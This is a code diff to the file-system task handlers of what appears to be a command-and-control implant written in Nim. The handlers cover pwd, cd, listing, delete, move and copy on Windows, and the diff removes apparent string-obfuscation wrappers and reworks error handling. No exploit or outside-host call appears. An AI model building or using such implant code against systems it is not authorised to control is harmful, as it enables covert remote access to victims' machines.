@@ -108,7 +108,7 @@ when defined(agent):
     # Retrieve current working directory
     proc executePwd(ctx: AgentCtx, task: Task): TaskResult = 
 
-        print protect("   [>] Retrieving current working directory.")
+        print "   [>] Retrieving current working directory."
 
         try: 
             # Get current working directory using GetCurrentDirectory
@@ -117,7 +117,7 @@ when defined(agent):
                 length = GetCurrentDirectoryW(MAX_PATH, &buffer)
             
             if length == 0:
-                raise newException(OSError, fmt"Failed to get working directory ({GetLastError()}).")
+                raise newException(CatchableError, GetLastError().getError())
 
             let output = $buffer[0 ..< (int)length]
             return createTaskResult(task, STATUS_COMPLETED, RESULT_STRING, string.toBytes(output))
@@ -132,12 +132,12 @@ when defined(agent):
         # Parse arguments
         let targetDirectory = Bytes.toString(task.args[0].data)
 
-        print protect("   [>] Changing current working directory to {targetDirectory}.")
+        print "   [>] Changing current working directory to {targetDirectory}."
 
         try: 
             # Get current working directory using GetCurrentDirectory
             if SetCurrentDirectoryW(targetDirectory) == FALSE:         
-                raise newException(OSError, fmt"Failed to change working directory ({GetLastError()}).")
+                raise newException(CatchableError, GetLastError().getError())
 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
@@ -160,7 +160,7 @@ when defined(agent):
                     cwdLength = GetCurrentDirectoryW(MAX_PATH, &cwdBuffer)
                 
                 if cwdLength == 0:
-                    raise newException(OSError, fmt"Failed to get working directory ({GetLastError()}).")
+                    raise newException(CatchableError, GetLastError().getError())
 
                 targetDirectory = $cwdBuffer[0 ..< (int)cwdLength]
 
@@ -187,7 +187,7 @@ when defined(agent):
             hFind = FindFirstFileW(searchPatternW, &findData)
             
             if hFind == INVALID_HANDLE_VALUE:
-                raise newException(OSError, fmt"Failed to list files ({GetLastError()}).")
+                raise newException(CatchableError, GetLastError().getError())
             
             # Directory was found and can be listed
             else:
@@ -305,7 +305,7 @@ when defined(agent):
 
         try: 
             if DeleteFile(target) == FALSE:         
-                raise newException(OSError, fmt"Failed to delete file ({GetLastError()}).")
+                raise newException(CatchableError, GetLastError().getError())
 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
@@ -323,7 +323,7 @@ when defined(agent):
 
         try: 
             if RemoveDirectoryA(target) == FALSE:         
-                raise newException(OSError, fmt"Failed to delete directory ({GetLastError()}).")
+                raise newException(CatchableError, GetLastError().getError())
 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
@@ -342,7 +342,7 @@ when defined(agent):
 
         try: 
             if MoveFile(lpExistingFileName, lpNewFileName) == FALSE:         
-                raise newException(OSError, fmt"Failed to move file or directory ({GetLastError()}).")
+                raise newException(CatchableError, GetLastError().getError())
 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
@@ -363,7 +363,7 @@ when defined(agent):
         try: 
             # Copy file to new location, overwrite if a file with the same name already exists
             if CopyFile(lpExistingFileName, lpNewFileName, FALSE) == FALSE:         
-                raise newException(OSError, fmt"Failed to copy file or directory ({GetLastError()}).")
+                raise newException(CatchableError, GetLastError().getError())
 
             return createTaskResult(task, STATUS_COMPLETED, RESULT_NO_OUTPUT, @[])
 
